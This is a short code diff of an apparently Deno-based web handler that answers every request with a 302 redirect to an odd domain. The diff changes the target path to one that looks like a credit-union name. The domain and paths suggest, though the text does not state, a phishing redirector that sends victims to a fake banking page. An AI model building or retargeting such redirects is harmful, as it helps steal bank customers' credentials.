@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://dispuacc-rvlwnow.co/fmid/",
+      Location: "https://dispuacc-rvlwnow.co/atomiccu/",
     },
   });
 });
